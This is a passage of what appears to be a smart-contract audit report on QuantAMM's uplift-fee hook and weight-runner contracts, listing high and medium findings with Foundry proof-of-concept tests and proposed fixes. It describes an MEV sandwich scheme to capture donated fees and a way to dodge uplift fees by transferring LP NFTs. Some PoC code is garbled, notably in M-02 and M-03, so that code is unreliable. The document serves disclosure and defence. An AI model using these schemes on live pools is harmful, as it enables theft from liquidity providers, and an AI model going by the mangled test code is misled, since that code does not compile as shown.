3- a MEV sees the whale liquidity removal and sandwich it (flashloan or use his own funds) add liquidity worth 1,000,000 (having 50% of the pool and getting 50% of the donation)

4- When the MEV submit a withdrawal, He will own (6,750,000 from donation + his own 1 million = 7,750,000)

5- his uplift is 5% \* \~8 = 40% = 3,100,000

6- MEV leave the pool with 4,650,000 having a profit of 4,650,000

The above numbered example may have exaggerated numbers only to show the feasibility of the MEV attack and the fee is not enough, attacks can be carried on smaller whales too, the idea stay the same

> _**NOTE!:**_ Its worth mentioning that above i assumed that `upliftFeeBps` is applied in the whole withdrawal value and not value increase only, thats how the code actually works, but that was another Bug

Assuming that `upliftFeeBps` is only applied on the value increase, then the attack will be completely easy to be carried by MEV, not requiring large whale % of pool getting out immediately Here is what happens

1- whale in wETH-USDC Pool having his balance got upLifted 500%

* from 2,500,000 USD/100wETH -> 12,500,000 USD/100wETH
* Total value in the Pool is 100,000,000

2- `upliftFeeBps` is set to 5% \* 5 \* 10,000,000 (value increase) (2,500,000) as fees donated to a pool of 87,500,000

3- a MEV sees the whale liquidity removal and sandwich it (flashloan or use his own funds) add liquidity worth 50,000,000 (having \~50% of the pool and getting \~50% of the donation)

4- When the MEV submit a withdrawal, He will own (1,750,000 from donation + his own 50 million = 51,750,000) (2% upLift)

5- his uplift is 5% \* \~2/100 = 0.1% = 0.1 \* 1,750,000 / 100 = 1750

6- MEV leave the pool with \~51,749,000 having a profit of 1,749,000

In the above second example, there can be small inaccuracies coming from small percentage change and uncertainty of how upLift Fees would actually apply to only upLift value

## Impact

Stealing of funds from LP providers

## Tools Used

Manual review

## Recommendations

implement timelock on LP providing, or implement vesting logic for donation

## <a id='H-11'></a>H-11. Users transferring their NFT position will retroactively get the new `upliftFeeBps`

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

When user transfer his NFT LP position to another wallet, the new `upliftFeeBps` is registered to `poolsFeeData` of the `to`, this contradict the intended design to have no retroactive  `upliftFeeBps` applied to already open position and also opens an attack surface to dodge the old high fees for the current smaller ones

## Vulnerability Details

> _**NOTE!**_: its worth mentioning that this is a different bug from the bug that talks about complete dodging of UpLift fees through `lpTokenDepositValue` overriding

When user adds liquidity, the `upliftFeeBps` is registered in his `poolsFeeData` so that any future change doesn't apply to his position retroactively

```solidity
File: UpliftOnlyExample.sol
219:     function addLiquidityProportional()

249: 
250:         poolsFeeData[pool][msg.sender].push(
251:             FeeData({
252:                 tokenID: tokenID,
253:                 amount: exactBptAmountOut,
254:                 //this rounding favours the LP
255:                 lpTokenDepositValue: depositValue,
256:                 //known use of timestamp, caveats are known.
257:                 blockTimestampDeposit: uint40(block.timestamp),
258:                 upliftFeeBps: upliftFeeBps
259:             })
260:         );

263:     }
```

But the problem is that in `afterUpdate` hook that is triggered on NFT transfers, the `upliftFeeBps` of `poolsFeeData` of `to` is set to the current `upliftFeeBps`

```solidity
File: UpliftOnlyExample.sol
576:     function afterUpdate(address _from, address _to, uint256 _tokenID) public {

609:                 feeDataArray[tokenIdIndex].lpTokenDepositValue = lpTokenDepositValueNow;
610:                 feeDataArray[tokenIdIndex].blockTimestampDeposit = uint32(block.number);
611:                 feeDataArray[tokenIdIndex].upliftFeeBps = upliftFeeBps;
612: 
613:                 //actual transfer not a afterTokenTransfer caused by a burn
614:                 poolsFeeData[poolAddress][_to].push(feeDataArray[tokenIdIndex]);

```

this causes two problems:

1. New fees are applied retroactively, which is not the intention of the protocol (Broken functionality)
2. There can be scenarios where `upliftFeeBps`  was set by the admin to lower values than the ones the user initially deposited at (ie, events of lower fees, or simply the admin wants to do it due to increased competition in the field that provided less fees, etc)
   * When that happens, the user can transfer the NFT to other wallet of his own so that the `upliftFeeBps` variable gets overridden by the new one

## Impact

* Non intended design
* User can decide to override their `upliftFeeBps` when they see it less costly to pay (overall profitable to them)
  * Leading to loss of funds (Fees) to the Quant Admin and LP providers (since there should have been larger fees donated to their pool)

## Tools Used

Manual review

## Recommendations

Don't override that variable, simply remove Line 611

## <a id='H-12'></a>H-12. fees sent to QuantAMMAdmin is stuck forever as there is no function to retrieve them

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

When a user removes liquidity from the pool he pays fees and a portion of the fees is liquidity added back for `QuantAMMAdmin`

Those funds are stuck in, and can't be removed as there is no mapping or NFT minted for those shares so any attempt to removeliquidity will revert

## Vulnerability Details

Here is the call inside `onAfterREmoveLiquidity` to add fees to `quantAMMAdmin`

```solidity
File: UpliftOnlyExample.sol
536:         if (localData.adminFeePercent > 0) {
537:             _vault.addLiquidity(
538:                 AddLiquidityParams({
539:                     pool: localData.pool,
540:                     to: IUpdateWeightRunner(_updateWeightRunner).getQuantAMMAdmin(),
541:                     maxAmountsIn: localData.accruedQuantAMMFees,
542:                     minBptAmountOut: localData.feeAmount.mulDown(localData.adminFeePercent) / 1e18,
543:                     kind: AddLiquidityKind.PROPORTIONAL,
544:                     userData: bytes("")
545:                 })
```

In `removeLiquidityProportional` there is a check for the length of `poolsFeeData` in this case, would be zero and any attempt to remove will revert

```solidity
File: UpliftOnlyExample.sol
265:     function removeLiquidityProportional(
266:         uint256 bptAmountIn,
267:         uint256[] memory minAmountsOut,
268:         bool wethIsEth,
269:         address pool
270:     ) external payable saveSender(msg.sender) returns (uint256[] memory amountsOut) {
271:         uint depositLength = poolsFeeData[pool][msg.sender].length;
272: 
273:         if (depositLength == 0) {
274:             revert WithdrawalByNonOwner(msg.sender, pool, bptAmountIn);
275:         }
```

### POC

Add this anywhere in `UpliftExample.t.sol`

```solidity
    function testRemoveLiquidity_Stuck_Admin_Fees() public {
        vm.prank(address(vaultAdmin));
        updateWeightRunner.setQuantAMMUpliftFeeTake(0.5e18);
        vm.stopPrank();

        // Add liquidity so bob has BPT to remove liquidity.
        uint256[] memory maxAmountsIn = [dai.balanceOf(bob), usdc.balanceOf(bob)].toMemoryArray();

        vm.prank(bob);
        upliftOnlyRouter.addLiquidityProportional(pool, maxAmountsIn, bptAmount, false, bytes(""));
        vm.stopPrank();

        uint256[] memory minAmountsOut = [uint256(0), uint256(0)].toMemoryArray();

        vm.startPrank(bob);
        upliftOnlyRouter.removeLiquidityProportional(bptAmount, minAmountsOut, false, pool);
        vm.stopPrank();
        BaseVaultTest.Balances memory balancesAfter = getBalances(updateWeightRunner.getQuantAMMAdmin());

        //trying to remove liquidity added to QuantAMMAdmin with the value added from bob removing liquidity the remove attempt will revert with `WithdrawalByNonOwner` error
        vm.prank(updateWeightRunner.getQuantAMMAdmin());
        vm.expectRevert();
        upliftOnlyRouter.removeLiquidityProportional(500000000000000000, minAmountsOut, false, pool);
        vm.stopPrank();

    }
```

## Impact

* **Loss of Funds**: Fees added as liquidity for `QuantAMMAdmin` are stuck and cannot be removed.

## Tools Used

manual review

## Recommendations

* create a new array while creating as done for normal addition

## <a id='H-13'></a>H-13. Incorrect uplift fee calculation leads to LPs incurring more fees than expected

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

According to the docs and white paper, the uplift fee is calculated only on the uplift/increase in the BPT value since deposit.

README

> Each deposit tracks its LP token value in a base currency. On withdrawal, any uplift since deposit will be the subject of the fee.

White paper (page 19)

> Withdrawal fees charged to LPs only on the increase in value LPs have received over the value they would have if they had HODLed

However the current Implementation does not follow this rule and the uplift fee calculated can exceed the fee % of the LPs uplift

## Vulnerability Details

In `UpliftOnlyExample::onAfterRemoveLiquidity`,

```solidity
    function onAfterRemoveLiquidity(
    //...
    ) public override onlySelfRouter(router) returns (bool, uint256[] memory hookAdjustedAmountsOutRaw) {

        // ...SNIP...

        //this rounding faxvours the LP
        localData.lpTokenDepositValueNow = getPoolLPTokenValue(localData.prices, pool, MULDIRECTION.MULDOWN);

        FeeData[] storage feeDataArray = poolsFeeData[pool][userAddress];
        localData.feeDataArrayLength = feeDataArray.length;
        localData.amountLeft = bptAmountIn;
        for (uint256 i = localData.feeDataArrayLength - 1; i >= 0; --i) {
            localData.lpTokenDepositValue = feeDataArray[i].lpTokenDepositValue;

@>          localData.lpTokenDepositValueChange =
                (int256(localData.lpTokenDepositValueNow) - int256(localData.lpTokenDepositValue)) /
                int256(localData.lpTokenDepositValue);

            uint256 feePerLP;
            // if the pool has increased in value since the deposit, the fee is calculated based on the deposit value
            if (localData.lpTokenDepositValueChange > 0) {
                feePerLP =
@>                  (uint256(localData.lpTokenDepositValueChange) * (uint256(feeDataArray[i].upliftFeeBps) * 1e18)) /
                    10000;
            }
            // if the pool has decreased in value since the deposit, the fee is calculated based on the base value - see wp
            else {
                //in most cases this should be a normal swap fee amount.
                //there always myst be at least the swap fee amount to avoid deposit/withdraw attack surgace.
                feePerLP = (uint256(minWithdrawalFeeBps) * 1e18) / 10000;
            }

            // if the deposit is less than the amount left to burn, burn the whole deposit and move on to the next
            if (feeDataArray[i].amount <= localData.amountLeft) {
                uint256 depositAmount = feeDataArray[i].amount;
@>              localData.feeAmount += (depositAmount * feePerLP);

                localData.amountLeft -= feeDataArray[i].amount;

                lpNFT.burn(feeDataArray[i].tokenID);

                delete feeDataArray[i];
                feeDataArray.pop();

                if (localData.amountLeft == 0) {
                    break;
                }
            } else {
                feeDataArray[i].amount -= localData.amountLeft;
                localData.feeAmount += (feePerLP * localData.amountLeft);
                break;
            }
        }

        // ...SNIP...
        
        return (true, hookAdjustedAmountsOutRaw);
    }
```

The issue is that on [Ln#495](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-hooks/contracts/hooks-quantamm/UpliftOnlyExample.sol#L495)  (` localData.feeAmount += (depositAmount * feePerLP)`) in the case of an uplift the fee is applied over the entire BPT amount instead of only the portion equvalent to the uplift value.

Consider the following case:
Alice is withdrawing 1000 BPT, BPT value at deposit was 5 usd and BPT value now is 10 usd. The upliftFeeBps is 1000 bps =  10%

**By Definition**
Alice initial BPT value is 5000 usd (1000 \* 5 usd) and her current BPT value is 10000 usd (1000 \* 10 usd).
That's 5000 usd (100%) increase which is equivalent to 500 BPT in curent value (5000 / 10).
Alice uplift fee should now be **10%** of her **uplift of 500 BPT** which is **50 BPT**.

However from **current Implementation**

$valueChange\% = \frac{10 - 5}{5} = 1$ that's 100% increase
$feePercent = 1 * \frac{1000}{10000} = 0.1$ , or 10%

Alice uplift fee is now calculated as $feeAmount = depositAmount * feePercent =  (1000 * 0.1) = 100 BPT$

100 BPT is 20% of the uplift of 500 BPT, meaning Alice pays double the expected fees because the uplift fee is taken from the entire `depositAmount`

## Impact

Medium - incorrect uplift fee calculation , and as a result LPs incur more fees than expected

## Tools Used

Manual Review

## Recommendations

Uplift should be charged only on the uplifted portion of the depositAmount, in this case that can be calculated as

$upliftAmount = \frac{valueChange\%}{1 + valueChange\%} * depositAmount$

$upliftFee = upliftAmount * upliftFeeBps$

$upliftFee = \frac{valueChange\%}{1 + valueChange\%} * depositAmount * upliftFeeBps$
where, $valueChange\% = \frac{value_{now} - value_{deposit}}{value_{deposit}}$
$ $
$upliftFee = \frac{ \frac{value_{now} - value_{deposit}}{value_{deposit}}}{ 1 +  \frac{value_{now} - value_{deposit}}{value_{deposit}}} * depositAmount * upliftFeeBps$
$upliftFee = \frac{value_{now} - value_{deposit}}{value_{now}} * depositAmount *  upliftFeeBps$

This is effectively a single line change in the `onAfterRemoveLiquidity` function

```diff
    function onAfterRemoveLiquidity(
        ...
    ) public override onlySelfRouter(router) returns (bool, uint256[] memory hookAdjustedAmountsOutRaw) {

        // ...SNIP...

        //this rounding faxvours the LP
        localData.lpTokenDepositValueNow = getPoolLPTokenValue(localData.prices, pool, MULDIRECTION.MULDOWN);

        FeeData[] storage feeDataArray = poolsFeeData[pool][userAddress];
        localData.feeDataArrayLength = feeDataArray.length;
        localData.amountLeft = bptAmountIn;
        for (uint256 i = localData.feeDataArrayLength - 1; i >= 0; --i) {
            localData.lpTokenDepositValue = feeDataArray[i].lpTokenDepositValue;

            localData.lpTokenDepositValueChange =
                (int256(localData.lpTokenDepositValueNow) - int256(localData.lpTokenDepositValue)) /
-               int256(localData.lpTokenDepositValue);
+               int256(localData.lpTokenDepositValueNow);

            uint256 feePerLP;
            // if the pool has increased in value since the deposit, the fee is calculated based on the deposit value
            if (localData.lpTokenDepositValueChange > 0) {
                feePerLP =
                    (uint256(localData.lpTokenDepositValueChange) * (uint256(feeDataArray[i].upliftFeeBps) * 1e18)) /
                    10000;
            }
            // if the pool has decreased in value since the deposit, the fee is calculated based on the base value - see wp
          
        // ...SNIP...
        
        return (true, hookAdjustedAmountsOutRaw);
    }
```


# Medium Risk Findings

## <a id='M-01'></a>M-01. quantAMMSwapFeeTake used for both getQuantAMMSwapFeeTake and getQuantAMMUpliftFeeTake.

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The `quantAMMSwapFeeTake` variable is used for both swap fee and uplift fee.\
This creates ambiguity in the contract's logic and exposes the system to potential misconfiguration or misuse, both `setQuantAMMSwapFeeTake` and `setQuantAMMUpliftFeeTake`\
methods modify the same state variable `quantAMMSwapFeeTake`, and both `getQuantAMMSwapFeeTake` and `getQuantAMMUpliftFeeTake` returns its value.

## Vulnerability Details

Both swap fee `QuantAMMSwapFeeTake` and uplift fee `QuantAMMUpliftFeeTake` share the same state variable, `quantAMMSwapFeeTake`.\
Modifying one fee setting overwrites the value for the other, causing potential fee loss if Admin decided to update swap fee the uplift fee\
will also updated.

POC: add test in [UpdateWeightRunner.t.sol](https://github.com/Cyfrin/2024-12-quantamm/blob/main/pkg/pool-quantamm/test/foundry/UpdateWeightRunner.t.sol)

```solidity
    function testChange_SwapFee_and_UpliftFee(uint256 fee) public {
        uint256 boundFee = bound(fee, 0, 1e18);

        vm.startPrank(owner);
          updateWeightRunner.setQuantAMMSwapFeeTake(boundFee);
        vm.stopPrank();

        assertEq(updateWeightRunner.getQuantAMMSwapFeeTake(), boundFee);
        assertEq(updateWeightRunner.getQuantAMMUpliftFeeTake(), boundFee);
    }
```

Result:

```solidity
Ran 1 test for test/foundry/UpdateWeightRunner.t.sol:UpdateWeightRunnerTest
[PASS] testChange_SwapFee_and_UpliftFee(uint256) (runs: 10000, μ: 23552, ~: 23301)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 492.87ms (491.41ms CPU time)
```

## Impact

If fees are misconfigured, the protocol might either overcharge or undercharge users, leading to a loss of fee revenue for Admin.

## Recommendations

```diff
    uint256 public quantAMMSwapFeeTake = 0.5e18;
+   uint256 public quantAMMUpliftFeeTake = 0.5e18;

    function setQuantAMMUpliftFeeTake(uint256 _quantAMMUpliftFeeTake) external{
        require(msg.sender == quantammAdmin, "ONLYADMIN");
        require(_quantAMMUpliftFeeTake <= 1e18, "Uplift fee must be less than 100%");
-       uint256 oldSwapFee = quantAMMSwapFeeTake;
-       quantAMMSwapFeeTake = _quantAMMUpliftFeeTake;
+       uint256 oldSwapFee = quantAMMUpliftFeeTake;
+       quantAMMUpliftFeeTake = _quantAMMUpliftFeeTake;
        emit UpliftFeeTakeSet(oldSwapFee, _quantAMMUpliftFeeTake);
    }

    // @notice Get the quantAMM uplift fee % amount allocated to the protocol for running costs
    function getQuantAMMUpliftFeeTake() external view returns (uint256){
-       return quantAMMSwapFeeTake;
+       return quantAMMUpliftFeeTake;
    }
```

## <a id='M-02'></a>M-02. `setUpdateWeightRunnerAddress` could break the protocol 

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

The current implementation of `UpdateWeightRunner` introduces a critical vulnerability in the protocol. If the `quantammAdmin` modifies the `UpdateWeightRunner`, it could lead to unexpected behavior where the protocol breaks. Specifically:

1. A new `UpdateWeightRunner` might have a different `quantammAdmin`, which would not align with the existing `Pool`.
2. The rule required by the new `UpdateWeightRunner` is not set because the rule is defined during the `Pool` initialization phase.

This issue creates inconsistencies in the protocol, potentially leading to a denial of service (DoS) for affected pools.

## Vulnerability Details

The vulnerability arises when the UpdateWeightRunner is changed, causing critical issues:

1. Admin Ownership Mismatch: The new UpdateWeightRunner may have a different quantAdmin, leading to conflicting authority and governance inconsistencies.

2. Missing Rules: The pool’s rules, set during initialization, are not carried over to the new UpdateWeightRunner. This prevents updates, effectively causing a denial-of-service (DoS) for the pool.

### Proof of Concept (POC)

Add the following test to `QuantAMMWeightedPool2TokenTest` to simulate the issue:

#### Initialization of the New `UpdateWeightRunner`:

```solidity
updateWeightRunner1 = new MockUpdateWeightRunner(owner, addr2, false); // Add this to the constructor
```

#### POC Test Case:

```solidity
MockUpdateWeightRunner updateWeightRunner1;

function testQuantAMMWeightedPoolGetNormalizedWeightsInitial_andThenChangeUpdateWeightRunner() public {
    QuantAMMWeightedPoolFactory.NewPoolParams memory params = _createPoolParams();
    params._initialWeights[0] = 0.6e18;
    params._initialWeights[1] = 0.4e18;

    (address quantAMMWeightedPool, ) = quantAMMWeightedPoolFactory.create(params);

    uint256[] memory weights = QuantAMMWeightedPool(quantAMMWeightedPool).getNormalizedWeights();

    int256;
    newWeights[0] = 0.6e18;
    newWeights[1] = 0.4e18;
    newWeights[2] = 0e18;
    newWeights[3] = 0e18;

    uint64;
    lambdas[0] = 0.2e18;

    int256;
    parameters0] = 0.2e18;

    address[][] memory oracles oracles[0][0]acle);

    MockMomentumRule momentumRule = new MockMomentumRule(owner);

    // Change UpdateWeightRunner
    vm.prank(owner);
    QuantAMMWeightedPool(quantAMMWeightedPool).setUpdateWeightRunnerAddress(address(updateWeightRunner1));
    
    QuantAMMWeightedPool(quantAMMWeightedPool).initialize(
        newWeights,
        IQuantAMMWeightedPool.PoolSettings(
            new IERC20 ,
            IUpdateRule(momentumRule),        oracles,
            60,
            lambdas,
            0.2e18,
            0.2e18,
            0.2e18,
            parameters,
            address(0)
        ),
        newWeights,
        newWeights,
        10
    );

    // Perform an update with the new runner
    vm.prank(owner);
    updateWeightRunner1.setApprovedActionsForPool(quantAMMWeightedPool, 1);
    updateWeightRunner1.performUpdate(quantAMMWeightedPool);
}
```

## Impact

Changing the `UpdateWeightRunner` leads to the following issues:

1. **Denial of Service (DoS):**\
   The new `UpdateWeightRunner` does not inherit the rule for the existing pool, rendering it non-functional.

2. **Unauthorized Updates:**\
   The `quantAdmin` of the initial `UpdateWeightRunner` can update the pool with the new `UpdateWeightRunner`, creating further inconsistencies.

These flaws disrupt the protocol and can lead to operational outages or malicious misuse.

## Tools Used

Manual review

## Recommendations

To address this vulnerability, update the `setUpdateWeightRunnerAddress` function to synchronize `quantammAdmin` and ensure the rule is correctly set during the update. Modify the function as follows:

### Updated Code

```diff
function setUpdateWeightRunnerAddress(address _updateWeightRunner) external override {
    require(msg.sender == quantammAdmin, "ONLYADMIN");
    updateWeightRunner = UpdateWeightRunner(_updateWeightRunner);
+   quantammAdmin = updateWeightRunner.quantammAdmin();
+   _setRule(); // Call set rule with the correct parameters
    emit UpdateWeightRunnerAddressUpdated(address(updateWeightRunner), _updateWeightRunner);
}
```

## <a id='M-03'></a>M-03. “Uplift Fee” Incorrectly Falls Back to Minimum Fee Due to Integer Division

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

A critical arithmetic error in the `onAfterRemoveLiquidity` function causes a protocol pool’s “uplift” fee calculation to zero out whenever the pool’s value grows less than 100%. Instead of charging an uplift fee, the code mistakenly reverts to the minimum fee, significantly under-collecting fees for moderate or even substantial positive gains. A proof-of-concept demonstrates that with a 50% price increase, the code applies only the minimum fee (5 BPS) instead of the intended 100 BPS uplift fee, potentially leading to major revenue loss.

## Vulnerability Details

In the [UpliftOnlyExample.sol#L474-L476](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-hooks/contracts/hooks-quantamm/UpliftOnlyExample.sol#L474-L476) snippet below, the deposit’s value change `lpTokenDepositValueChange` is computed with integer division:

```solidity
localData.lpTokenDepositValueChange =
    (int256(localData.lpTokenDepositValueNow) - int256(localData.lpTokenDepositValue)) /
    int256(localData.lpTokenDepositValue);
```

Since Solidity integer division truncates any fractional part, any gain smaller than the deposit’s full value leads to `lpTokenDepositValueChange` being zero. For example, if a position grows 50% (`valueNow = 1.5 × depositValue`), the difference `(1.5D - 1.0D)` is `0.5D`, but integer division by `1.0D` yields zero.

The immediate downstream effect is shown in [UpliftOnlyExample.sol#L478-L490](https://github.com/Cyfrin/2024-12-quantamm/blob/a775db4273eb36e7b4536c5b60207c9f17541b92/pkg/pool-hooks/contracts/hooks-quantamm/UpliftOnlyExample.sol#L478-L490). The code checks whether `lpTokenDepositValueChange > 0`. If it is zero, the logic incorrectly falls back to the “minimum withdrawal fee,” instead of the intended “uplift fee.”

```solidity
uint256 feePerLP;
// if the pool has increased in value since the deposit, the fee is calculated based on the deposit value
if (localData.lpTokenDepositValueChange > 0) {
    feePerLP =
        (uint256(localData.lpTokenDepositValueChange) * (uint256(feeDataArray[i].upliftFeeBps) * 1e18)) /
        10000;
}
// if the pool has decreased in value since the deposit, the fee is calculated based on the base value
else {
    feePerLP = (uint256(minWithdrawalFeeBps) * 1e18) / 10000;
}
```

Hence, even when a depositor’s position appreciates by a moderate percentage (e.g., 10%, 50%, or 80%), the computed `lpTokenDepositValueChange` remains `0` and triggers the fallback `minWithdrawalFeeBps`. This drastically undercharges withdrawal fees, effectively nullifying the “uplift” fee logic for positive price changes under 100% growth. As a result, LPs will pay only the minimal fee in scenarios where they would normally be subject to a higher fee based on their real gains.

## Impact

This flaw in fee calculation allows LPs to systematically evade the intended uplift fee whenever their position appreciates less than 100%. In real-world conditions, even moderate gains (like 10%, 30%, or 50%) get zeroed out, causing the protocol to charge only the minimum fee instead of a proportionally larger fee based on the actual uplift. As a result, the protocol forfeits significant revenue and violates the intended fee structure:

* **Serious Undercharging**: The pool cannot collect the correct “uplift” portion, leading to lost revenue that can accumulate quickly over multiple deposits/withdrawals.
* **Broken Fee Mechanism**: The entire premise of an uplift-based fee becomes unreliable, since nearly any typical growth scenario falls below a factor of 2×, thus never triggering the intended logic.
* **Exploitable for Profit**: Users aware of this vulnerability can strategically deposit and withdraw under moderate gains to exploit the cheaper fee, amplifying potential losses for the protocol.

Below is a proof-of-concept test demonstrating the incorrect fallback to the minimal fee in a “small positive price change” scenario. The test shows that a 50% increase in pool value still charges only the minimum withdrawal fee instead of the uplift fee:

> **PoC Test Code**

```Solidity
// import ...
import "forge-std/console2.sol";
import {IVaultExplorer} from "@balancer-labs/v3-interfaces/contracts/vault/IVaultExplorer.sol";
// import ...

contract UpliftOnlyExampleTest is BaseVaultTest {
	// other test functions ...

	// PoC test function
    function testRemoveLiquiditySmallPositivePriceChangeWrongFee() public {
        // Add liquidity
        uint256[] memory maxAmountsIn = [dai.balanceOf(bob), usdc.balanceOf(bob)].toMemoryArray();
        vm.prank(bob);
        upliftOnlyRouter.addLiquidityProportional(pool, maxAmountsIn, bptAmount, false, bytes(""));
        vm.stopPrank();

        // Set prices to be 3/2 of the initial prices (int256(i) * 1e18)
        // (refer to the test function `testRemoveLiquidityDoublePositivePriceChange`, #L551)
        int256[] memory prices = new int256[]();
        int256 priceMultiplier = 3e18 / 2;
        for (uint256 i = 0; i < tokens.length; ++i) {
            prices[i] = int256(i) * priceMultiplier;
        }
        updateWeightRunner.setMockPrices(pool, prices);

        // upliftOnlyRouter default fee rates
        console2.log("upliftOnlyRouter.upliftFeeBps: ", upliftOnlyRouter.upliftFeeBps());
        console2.log("upliftOnlyRouter.minWithdrawalFeeBps: ", upliftOnlyRouter.minWithdrawalFeeBps());

        // lpTokenDepositValueChange should only consider prices change ratio, since pool balances remain the same
        // (priceMultiplier - 1e18) times 1e18 before division to avoid rounding to zero
        // (refer to the function `getPoolLPTokenValue` of the contract `UpliftOnlyExample`, #L672)
        // (refer to the logics of test function `testRemoveLiquidityDoublePositivePriceChange`)
        int256 lpTokenDepositValueChange = (priceMultiplier - 1e18) * 1e18 / 1e18;
        console2.log("lpTokenDepositValueChange: ", lpTokenDepositValueChange);
        assertTrue(lpTokenDepositValueChange > 0, "lpTokenDepositValueChange should be positive");

        // Calculate expected feePerLP and feePercentageBps
        // (refer to the function `onAfterRemoveLiquidity` of the contract `UpliftOnlyExample`, #L480-484)
        // (refer to the function `onAfterRemoveLiquidity` of the contract `UpliftOnlyExample`, #L495, #L514)
        uint256 feePerLPExpected = uint256(lpTokenDepositValueChange) * uint256(upliftOnlyRouter.upliftFeeBps()) / 10000;
        uint256 feePercentageExpectedBps = (bptAmount * feePerLPExpected) / bptAmount * 10000 / 1e18;
        console2.log("feePercentageExpectedBps: ", feePercentageExpectedBps);

        // Record pool states before remove liquidity
        uint256 bptTotalSupplyBeforeRemoveLiquidity = IVaultExplorer(address(vault)).totalSupply(pool);
        uint256[] memory poolBalancesBeforeRemoveLiquidity =
            IVaultExplorer(address(vault)).getPoolData(pool).balancesLiveScaled18;

        // Remove liquidity
        uint256[] memory minAmountsOut = [uint256(0), uint256(0)].toMemoryArray();
        uint256[] memory amountsOut = new uint256[]();
        vm.startPrank(bob);
        amountsOut = upliftOnlyRouter.removeLiquidityProportional(bptAmount, minAmountsOut, false, pool);
        vm.stopPrank();

        // Calculate raw amountsOut in proportional manner when remove liquidity
        // (refer to the function `computeProportionalAmountsOut` of the contract `BasePoolMath`, #L106)
        uint256[] memory amountsOutRaw = new uint256[]();
        for (uint256 i = 0; i < 2; ++i) {
            amountsOutRaw[i] = poolBalancesBeforeRemoveLiquidity[i] * bptAmount / bptTotalSupplyBeforeRemoveLiquidity;
        }

        // Calculate fee amounts and percentages
        uint256[] memory feeAmounts = new uint256[]();
        uint256[] memory feePercentagesActualBps = new uint256[]();
        for (uint256 i = 0; i < 2; ++i) {
            feeAmounts[i] = amountsOutRaw[i] - amountsOut[i];
            feePercentagesActualBps[i] = feeAmounts[i] * 10000 / amountsOutRaw[i];
            console2.log("feeAmounts[", i, "]: ", feeAmounts[i]);
            console2.log("feePercentagesActualBps[", i, "]: ", feePercentagesActualBps[i]);
        }

        // Check if the fee percentages are matched with the designed rates
        for (uint256 i = 0; i < 2; ++i) {
            assertTrue(
                feePercentagesActualBps[i] != feePercentageExpectedBps,
                "fee percentage is not based on the uplift fee rate due to the integer division rounding vulnerability"
            );
            assertTrue(
                feePercentagesActualBps[i] == upliftOnlyRouter.minWithdrawalFeeBps(),
                "fee percentage is the minimum fee rate due to the integer division rounding vulnerability"
            );
        }
    }
}
```

> **Test Command**

```Solidity
forge test --mc UpliftOnlyExampleTest --mt testRemoveLiquiditySmallPositivePriceChangeWrongFee -vv
```

> **Test Result**

```Solidity
Ran 1 test for test/foundry/UpliftExample.t.sol:UpliftOnlyExampleTest
[PASS] testRemoveLiquiditySmallPositivePriceChangeWrongFee() (gas: 637610)
Logs:
  upliftOnlyRouter.upliftFeeBps:  200
  upliftOnlyRouter.minWithdrawalFeeBps:  5
  lpTokenDepositValueChange:  500000000000000000
  feePercentageExpectedBps:  100
  feeAmounts[ 0 ]:  500000000000000000
  feePercentagesActualBps[ 0 ]:  5
  feeAmounts[ 1 ]:  500000000000000000
  feePercentagesActualBps[ 1 ]:  5

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 28.03ms (2.82ms CPU time)

Ran 1 test suite in 127.25ms (28.03ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Tools Used

Manual Review

## Recommendations

To fix the integer‐division issue, **scale up** the difference by `1e18` before dividing by the original deposit value. This ensures fractional parts are not truncated to zero. Specifically:

1. **Modify the computation of** `lpTokenDepositValueChange`:
   ```diff
   localData.lpTokenDepositValueChange =
   -   (int256(localData.lpTokenDepositValueNow) - int256(localData.lpTokenDepositValue)) /
   +   (int256(localData.lpTokenDepositValueNow) - int256(localData.lpTokenDepositValue)) * 1e18 /
       int256(localData.lpTokenDepositValue);
   ```

2. **Remove the extra `* 1e18` factor** (or equivalently, do not multiply by `1e18` a second time) when computing `feePerLP`:
   ```diff
   if (localData.lpTokenDepositValueChange > 0) {
       feePerLP =
   -       (uint256(localData.lpTokenDepositValueChange) * (uint256(feeDataArray[i].upliftFeeBps) * 1e18))
   +       uint256(localData.lpTokenDepositValueChange) * uint256(feeDataArray[i].upliftFeeBps)
           / 10000;
   } else {
       feePerLP = (uint256(minWithdrawalFeeBps) * 1e18) / 10000;
   }
   ```

With these changes, `lpTokenDepositValueChange` accurately represents a **scaled fraction** of growth (e.g., `0.5e18` for a 50% gain). The subsequent fee logic then compares it against zero as intended, preventing the protocol from under‐charging fees on modest or moderate gains. This aligns the computed fee with the pool’s actual value appreciation.

## <a id='M-04'></a>M-04. The user will lost his liquidity if he transfers the LP NFT to himself

_Submitted by [undefined](https://profiles.cyfrin.io/u/undefined). Selected submission by: [undefined](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

In the `afterUpdate` function of the `UpliftOnlyExample` contract, there exists a logical flaw when an NFT's ownership is updated but the `_from` and `_to` addresses are the same. If the NFT is being updated and transferred to the same address (i.e., `_from == _to`), the contract will incorrectly delete the `feeDataArray` , lending to loss of LP NFT.

## Vulnerability Details

The  function `afterUpdate` is a post-transfer hook that is called after an overridden `_update` function in an `LPNFT` contract:

```Solidity
/// @inheritdoc ERC721
    function _update(address to, uint256 tokenId, address auth) internal override returns (address previousOwner) {
        previousOwner  = super._update(to, tokenId, auth);
        //_update is called during mint, burn and transfer. This functionality is only for transfer
        if (to != address(0) && previousOwner != address(0)) {
